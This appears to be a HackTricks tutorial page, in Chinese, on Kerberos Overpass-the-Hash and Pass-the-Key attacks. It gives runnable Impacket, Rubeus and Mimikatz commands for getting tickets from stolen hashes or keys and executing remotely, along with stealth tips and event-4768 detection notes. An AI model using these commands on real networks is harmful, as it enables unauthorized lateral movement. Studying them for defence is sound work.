# Over Pass the Hash/Pass the Key

{{#include ../../banners/hacktricks-training.md}}


## Overpass The Hash/Pass The Key (PTK)

**Overpass The Hash/Pass The Key (PTK)** attack 专为传统 NTLM 协议受限且 Kerberos authentication 占据优先地位的环境而设计。此攻击利用用户的 NTLM hash 或 AES keys 请求 Kerberos tickets，从而未经授权访问网络中的资源。

严格来说：

- **Over-Pass-the-Hash** 通常是指通过 **RC4-HMAC** Kerberos key 将 **NT hash** 转换为 Kerberos TGT。
- **Pass-the-Key** 是更通用的版本，表示你已经拥有 **AES128/AES256** 等 Kerberos key，并直接使用它请求 TGT。

这一差异在 hardened environments 中十分重要：如果 **RC4 已被禁用**，或 KDC 不再默认使用 RC4，那么仅凭 **NT hash** 就不够了，你需要 **AES key**（或用于派生 AES key 的明文密码）。

要执行此攻击，第一步是获取目标用户账户的 NTLM hash 或密码。获得这些信息后，即可为该账户获取 Ticket Granting Ticket (TGT)，从而访问该用户有权限使用的服务或机器。

可以使用以下命令启动该过程：<sup>[[1]](#references)</sup>
```bash
python getTGT.py -dc-ip 10.10.10.10 jurassic.park/velociraptor -hashes :2a3de7fe356ee524cc9f3d579f2e0aa7
export KRB5CCNAME=/root/impacket-examples/velociraptor.ccache
python psexec.py jurassic.park/velociraptor@labwws02.jurassic.park -k -no-pass
```
对于需要使用 AES256 的场景，可以使用 `-aesKey [AES key]` 选项：<sup>[[1]](#references)</sup>
```bash
python getTGT.py -dc-ip 10.10.10.10 jurassic.park/velociraptor -aesKey <AES256_HEX>
export KRB5CCNAME=velociraptor.ccache
python wmiexec.py -k -no-pass jurassic.park/velociraptor@labwws02.jurassic.park
```
`getTGT.py` 还支持通过 **AS-REQ** 使用 `-service <SPN>` 直接请求 **service ticket**，当你希望获取特定 SPN 的 ticket 而无需额外的 TGS-REQ 时，这一功能非常有用：
```bash
python getTGT.py -dc-ip 10.10.10.10 -aesKey <AES256_HEX> -service cifs/labwws02.jurassic.park jurassic.park/velociraptor
```
此外，获取的 ticket 还可以与各种工具结合使用，包括 `smbexec.py` 或 `wmiexec.py`，从而扩大攻击范围。

遇到 _PyAsn1Error_ 或 _KDC cannot find the name_ 等问题时，通常可以通过更新 Impacket library，或使用主机名而不是 IP 地址来解决，从而确保与 Kerberos KDC 的兼容性。

使用 Rubeus.exe 的另一组命令序列展示了该技术的另一个方面：<sup>[[1]](#references)</sup>
```bash
.\Rubeus.exe asktgt /domain:jurassic.park /user:velociraptor /rc4:2a3de7fe356ee524cc9f3d579f2e0aa7 /ptt
.\PsExec.exe -accepteula \\labwws02.jurassic.park cmd
```
此方法与 **Pass the Key** 方式类似，重点是劫持并直接利用 ticket 进行身份验证。实际上：

- `Rubeus asktgt` 自身发送 **raw Kerberos AS-REQ/AS-REP**，除非你想通过 `/luid` 针对其他 logon session，或通过 `/createnetonly` 创建单独的 logon session，否则不需要 admin 权限。<sup>[[2]](#references)</sup>
- `mimikatz sekurlsa::pth` 会将凭据材料写入 logon session，因此会接触 **LSASS**，通常需要 local admin 或 `SYSTEM` 权限；从 EDR 的角度来看，这种方式也更加嘈杂。

使用 Mimikatz 的示例：
```bash
sekurlsa::pth /user:velociraptor /domain:jurassic.park /ntlm:2a3de7fe356ee524cc9f3d579f2e0aa7 /run:cmd.exe
sekurlsa::pth /user:velociraptor /domain:jurassic.park /aes256:<AES256_HEX> /run:cmd.exe
```
为符合操作安全要求并使用 AES256，可以执行以下命令：
```bash
.\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:HASH /nowrap /opsec
```
`/opsec` 之所以相关，是因为 Rubeus 生成的流量与原生 Windows Kerberos 略有不同。还要注意，`/opsec` 适用于 **AES256** 流量；将其与 RC4 一起使用通常需要 `/force`，这会削弱其大部分意义，因为在**现代域环境中使用 RC4 本身就是一个强信号**。

## 检测说明

每次 TGT 请求都会在 DC 上生成**事件 `4768`**。在当前 Windows 构建版本中，该事件包含的有用字段比旧版资料中提到的更多：

- `TicketEncryptionType` 表示签发的 TGT 使用的加密类型。典型值包括：**RC4-HMAC** 对应 `0x17`，**AES128** 对应 `0x11`，**AES256** 对应 `0x12`。<sup>[[3]](#references)</sup>
- 更新后的事件还会公开 `SessionKeyEncryptionType`、`PreAuthEncryptionType` 以及客户端声明支持的加密类型，这有助于区分**真实的 RC4 依赖**与容易造成混淆的旧版默认设置。
- 在现代环境中看到 `0x17`，通常说明该账户、主机或 KDC fallback 路径仍允许使用 RC4，因此更适合基于 NT hash 的 Over-Pass-the-Hash。

自 2022 年 11 月的 Kerberos hardening 更新以来，Microsoft 一直在逐步减少默认使用 RC4 的行为；当前发布的指导建议在 **2026 年第二季度结束前移除 RC4 作为 AD DC 的默认假定加密类型**。从攻击角度来看，这意味着使用 **AES 的 Pass-the-Key** 正逐渐成为更可靠的路径，而经典的**仅依赖 NT hash 的 OpTH** 在经过 hardening 的环境中将越来越容易失败。<sup>[[3]](#references)</sup>

有关 Kerberos 加密类型及相关 ticket 行为的更多详情，请查看：

{{#ref}}
kerberos-authentication.md
{{#endref}}

## 更隐蔽的版本

> [!WARNING]
> 每个 logon session 同时只能有一个处于活动状态的 TGT，因此请务必小心。

1. 使用 Cobalt Strike 的 **`make_token`** 创建新的 logon session。
2. 然后，使用 Rubeus 为新的 logon session 生成 TGT，而不影响现有 session。

你也可以直接通过 Rubeus，使用一个临时的**登录类型 9** session，实现类似的隔离：
```bash
.\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:<AES256_HEX> /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```
这可以避免覆盖当前会话的 TGT，通常比将 ticket 导入现有的 logon session 更安全。

## 参考资料

- [1] [Tarlogic - Kerberos (II): ¿Cómo atacar Kerberos?](https://www.tarlogic.com/es/blog/como-atacar-kerberos/)
- [2] [GhostPack - Rubeus（GitHub 仓库）](https://github.com/GhostPack/Rubeus)
- [3] [Microsoft Learn - 检测并修复 Kerberos 中的 RC4 使用情况](https://learn.microsoft.com/en-us/windows-server/security/kerberos/detect-remediate-rc4-kerberos)

{{#include ../../banners/hacktricks-training.md}}
